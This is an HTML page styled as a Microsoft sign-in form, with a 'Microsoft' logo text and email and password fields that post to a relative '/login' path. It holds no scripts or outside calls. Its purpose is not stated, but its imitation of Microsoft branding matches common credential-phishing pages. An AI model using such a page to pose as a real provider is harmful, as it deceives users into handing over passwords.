<html lang="en">
<head>
<meta charset="UTF-8">
<title>Sign in to Microsoft</title>
<style>
body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; margin: 0; }
.card { width: 320px; margin: 60px auto; background: #fff; border: 1px solid #e1e1e1; }
.logo { text-align: center; padding: 16px; border-bottom: 1px solid #e1e1e1; font-weight: 600; color: #2f2f2f; }
form { padding: 16px; }
input { width: 100%; box-sizing: border-box; padding: 8px; margin: 6px 0; border: 1px solid #ccc; }
button { width: 100%; padding: 10px; background: #0067b8; color: #fff; border: none; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">Microsoft</div>
  <form action="/login" method="post">
    <input type="email" name="email" placeholder="Email address" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Sign in</button>
  </form>
</div>
</body>
</html>
